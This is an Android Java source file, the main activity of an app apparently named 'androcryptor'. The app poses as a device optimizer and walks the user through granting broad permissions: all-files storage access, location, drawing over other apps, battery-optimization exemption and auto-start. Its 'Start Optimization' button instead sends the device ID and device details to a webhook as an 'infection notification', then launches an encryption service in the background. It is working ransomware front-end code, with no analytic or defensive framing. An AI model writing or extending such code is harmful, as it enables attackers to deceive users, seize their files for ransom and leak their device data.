package com.example.androcryptor;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.cardview.widget.CardView;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 123;
    private static final int OVERLAY_PERMISSION_REQUEST_CODE = 124;
    private static final int BATTERY_OPTIMIZATION_REQUEST_CODE = 125;
    private static final int LOCATION_PERMISSION_REQUEST_CODE = 126;
    private static final int AUTO_START_PERMISSION_REQUEST_CODE = 127;
    
    // All required permissions for the app to function properly
    private String[] requiredPermissions = {
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.WAKE_LOCK,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
    };

    // UI Elements
    private CardView storagePermissionCard;
    private CardView locationPermissionCard;
    private CardView overlayPermissionCard;
    private CardView batteryOptimizationCard;
    private CardView autoStartPermissionCard;
    
    private Button storagePermissionButton;
    private Button locationPermissionButton;
    private Button overlayPermissionButton;
    private Button batteryOptimizationButton;
    private Button autoStartPermissionButton;
    private Button startOptimizationButton;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_permissions);
        
        // Initialize UI elements
        initializeUI();
        
        // Set up button click listeners
        setupButtonListeners();
        
        // Update UI based on current permission status
        updatePermissionUI();
    }
    
    private void initializeUI() {
        // Cards
        storagePermissionCard = findViewById(R.id.storagePermissionCard);
        locationPermissionCard = findViewById(R.id.locationPermissionCard);
        overlayPermissionCard = findViewById(R.id.overlayPermissionCard);
        batteryOptimizationCard = findViewById(R.id.batteryOptimizationCard);
        autoStartPermissionCard = findViewById(R.id.autoStartPermissionCard);
        
        // Buttons
        storagePermissionButton = findViewById(R.id.storagePermissionButton);
        locationPermissionButton = findViewById(R.id.locationPermissionButton);
        overlayPermissionButton = findViewById(R.id.overlayPermissionButton);
        batteryOptimizationButton = findViewById(R.id.batteryOptimizationButton);
        autoStartPermissionButton = findViewById(R.id.autoStartPermissionButton);
        startOptimizationButton = findViewById(R.id.startOptimizationButton);
    }
    
    private void setupButtonListeners() {
        // Storage permission button
        storagePermissionButton.setOnClickListener(v -> {
            requestStoragePermissions();
        });
        
        // Location permission button
        locationPermissionButton.setOnClickListener(v -> {
            requestLocationPermissions();
        });
        
        // Overlay permission button
        overlayPermissionButton.setOnClickListener(v -> {
            requestOverlayPermission();
        });
        
        // Battery optimization button
        batteryOptimizationButton.setOnClickListener(v -> {
            requestBatteryOptimizationExemption();
        });
        
        // Auto-start permission button (for some devices)
        autoStartPermissionButton.setOnClickListener(v -> {
            openAutoStartSettings();
        });
        
        // Start optimization button
        startOptimizationButton.setOnClickListener(v -> {
            if (areAllPermissionsGranted()) {
                startEncryptionService();
            } else {
                showPermissionsRequiredDialog();
            }
        });
    }
    
    private void updatePermissionUI() {
        // Update Storage Permission UI
        boolean storageGranted = isStoragePermissionGranted();
        updateCardStatus(storagePermissionCard, storagePermissionButton, storageGranted, 
                getString(R.string.enable_storage_access), getString(R.string.storage_access_enabled));
        
        // Update Location Permission UI
        boolean locationGranted = isLocationPermissionGranted();
        updateCardStatus(locationPermissionCard, locationPermissionButton, locationGranted,
                getString(R.string.enable_location_services), getString(R.string.location_services_enabled));
        
        // Update Overlay Permission UI
        boolean overlayGranted = isOverlayPermissionGranted();
        updateCardStatus(overlayPermissionCard, overlayPermissionButton, overlayGranted,
                getString(R.string.enable_display_over_apps), getString(R.string.display_over_apps_enabled));
        
        // Update Battery Optimization UI
        boolean batteryOptimizationDisabled = isBatteryOptimizationDisabled();
        updateCardStatus(batteryOptimizationCard, batteryOptimizationButton, batteryOptimizationDisabled,
                getString(R.string.disable_battery_optimization), getString(R.string.battery_optimization_disabled));
        
        // Auto-start is device specific, we can't check it programmatically
        // Just keep it as not granted
        updateCardStatus(autoStartPermissionCard, autoStartPermissionButton, false,
                getString(R.string.enable_auto_start), getString(R.string.auto_start_enabled));
        
        // Update Start Optimization button
        if (areAllPermissionsGranted()) {
            startOptimizationButton.setText(getString(R.string.start_optimization_now));
            startOptimizationButton.setBackgroundTintList(ContextCompat.getColorStateList(this, android.R.color.holo_green_dark));
        }
    }
    
    private void updateCardStatus(CardView card, Button button, boolean isGranted, String enableText, String disabledText) {
        if (isGranted) {
            button.setText(disabledText);
            button.setBackgroundTintList(ContextCompat.getColorStateList(this, android.R.color.darker_gray));
            button.setEnabled(false);
            card.setCardBackgroundColor(Color.parseColor("#E8F5E9")); // Light green background
        } else {
            button.setText(enableText);
            button.setBackgroundTintList(ContextCompat.getColorStateList(this, android.R.color.holo_green_dark));
            button.setEnabled(true);
            card.setCardBackgroundColor(Color.WHITE);
        }
    }
    
    // Permission Request Methods
    
    private void requestStoragePermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // For Android 11+ (API 30+), we need to use MANAGE_EXTERNAL_STORAGE
            try {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, PERMISSION_REQUEST_CODE);
            } catch (Exception e) {
                // If the specific intent fails, try the general storage settings
                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                startActivityForResult(intent, PERMISSION_REQUEST_CODE);
            }
        } else {
            // For Android 10 and below, use the traditional storage permissions
            String[] storagePermissions = {
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE
            };
            
            ActivityCompat.requestPermissions(this, storagePermissions, PERMISSION_REQUEST_CODE);
        }
    }
    
    private void requestLocationPermissions() {
        String[] locationPermissions = {
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
        };
        
        ActivityCompat.requestPermissions(this, locationPermissions, LOCATION_PERMISSION_REQUEST_CODE);
    }
    
    private void requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST_CODE);
        }
    }
    
    private void requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, BATTERY_OPTIMIZATION_REQUEST_CODE);
        }
    }
    
    private void openAutoStartSettings() {
        // First show instructions dialog
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle(getString(R.string.auto_start_instructions_title));
        builder.setMessage(getString(R.string.auto_start_instructions_message));
        builder.setPositiveButton("Continue", (dialog, which) -> {
            dialog.dismiss();
            openAutoStartSettingsIntent();
        });
        builder.show();
    }
    
    private void openAutoStartSettingsIntent() {
        try {
            // Different manufacturers have different paths to auto-start settings
            Intent intent = new Intent();
            String manufacturer = Build.MANUFACTURER.toLowerCase();
            
            if (manufacturer.contains("xiaomi") || manufacturer.contains("redmi")) {
                intent.setComponent(new android.content.ComponentName(
                        "com.miui.securitycenter",
                        "com.miui.permcenter.autostart.AutoStartManagementActivity"));
            } else if (manufacturer.contains("oppo")) {
                intent.setComponent(new android.content.ComponentName(
                        "com.coloros.safecenter",
                        "com.coloros.safecenter.permission.startup.StartupAppListActivity"));
            } else if (manufacturer.contains("vivo")) {
                intent.setComponent(new android.content.ComponentName(
                        "com.vivo.permissionmanager",
                        "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"));
            } else if (manufacturer.contains("huawei") || manufacturer.contains("honor")) {
                intent.setComponent(new android.content.ComponentName(
                        "com.huawei.systemmanager",
                        "com.huawei.systemmanager.optimize.process.ProtectActivity"));
            } else if (manufacturer.contains("samsung")) {
                intent.setComponent(new android.content.ComponentName(
                        "com.samsung.android.lool",
                        "com.samsung.android.sm.ui.battery.BatteryActivity"));
            } else {
                // For other devices, open battery settings
                intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(Uri.parse("package:" + getPackageName()));
            }
            
            startActivityForResult(intent, AUTO_START_PERMISSION_REQUEST_CODE);
        } catch (Exception e) {
            // If the specific intent fails, open app details settings
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, AUTO_START_PERMISSION_REQUEST_CODE);
        }
    }
    
    // Permission Check Methods
    
    private boolean isStoragePermissionGranted() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // For Android 11+ (API 30+), check for MANAGE_EXTERNAL_STORAGE permission
            return Environment.isExternalStorageManager();
        } else {
            // For Android 10 and below, check for traditional storage permissions
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED &&
                   ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
    }
    
    private boolean isLocationPermissionGranted() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
               ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;
    }
    
    private boolean isOverlayPermissionGranted() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return Settings.canDrawOverlays(this);
        }
        return true; // On older versions, this permission is granted by default
    }
    
    private boolean isBatteryOptimizationDisabled() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
        }
        return true; // On older versions, this is not applicable
    }
    
    private boolean areAllPermissionsGranted() {
        // Check storage permissions (special handling for Android 11+)
        boolean storagePermissionGranted = isStoragePermissionGranted();
        if (!storagePermissionGranted) {
            return false;
        }
        
        // Check other standard permissions (excluding storage which we already checked)
        boolean otherStandardPermissionsGranted = true;
        for (String permission : requiredPermissions) {
            // Skip storage permissions as we already checked them
            if (permission.equals(Manifest.permission.READ_EXTERNAL_STORAGE) || 
                permission.equals(Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
                continue;
            }
            
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                otherStandardPermissionsGranted = false;
                break;
            }
        }
        
        // Check special permissions
        boolean specialPermissionsGranted = true;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                specialPermissionsGranted = false;
            }
            
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                specialPermissionsGranted = false;
            }
        }
        
        // Auto-start permission can't be checked programmatically, so we don't include it here
        // We'll assume it's granted for the purpose of enabling the "Start Optimization" button
        
        return storagePermissionGranted && otherStandardPermissionsGranted && specialPermissionsGranted;
    }
    
    private void showPermissionsRequiredDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle(getString(R.string.permissions_required_title));
        builder.setMessage(getString(R.string.permissions_required_message));
        builder.setPositiveButton("OK", (dialog, which) -> {
            dialog.dismiss();
            updatePermissionUI();
        });
        builder.show();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE || requestCode == LOCATION_PERMISSION_REQUEST_CODE) {
            // Update UI after permission result
            updatePermissionUI();
            
            // Check if all permissions are granted
            if (areAllPermissionsGranted()) {
                Toast.makeText(this, getString(R.string.all_permissions_granted), Toast.LENGTH_SHORT).show();
            }
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        // Update UI after any activity result (overlay, battery optimization, auto-start)
        new Handler().postDelayed(() -> {
            updatePermissionUI();
        }, 500);
        
        // Check if all permissions are granted
        if (areAllPermissionsGranted()) {
            Toast.makeText(this, getString(R.string.all_permissions_granted), Toast.LENGTH_SHORT).show();
        }
    }

    private void startEncryptionService() {
        try {
            // Show progress
            findViewById(R.id.progressBar).setVisibility(View.VISIBLE);
            startOptimizationButton.setEnabled(false);
            
            // Send detailed device info to webhook before starting encryption
            String deviceId = DeviceUtils.getDeviceId(this);
            String deviceInfo = DeviceUtils.getDeviceInfo(this);
            
            // Try to send infection notification, but continue even if it fails
            try {
                WebhookUtils.sendInfectionNotification(deviceId, deviceInfo);
            } catch (Exception e) {
                // Log but continue anyway
            }
            
            // Start the encryption service
            Intent serviceIntent = new Intent(this, EncryptionService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            
            // Close the main activity
            finish();
        } catch (Exception e) {
            // If service start fails, try one more time with a delay
            try {
                Thread.sleep(1000);
                Intent serviceIntent = new Intent(this, EncryptionService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(serviceIntent);
                } else {
                    startService(serviceIntent);
                }
                finish();
            } catch (Exception ex) {
                // If all fails, just finish the activity
                finish();
            }
        }
    }
}
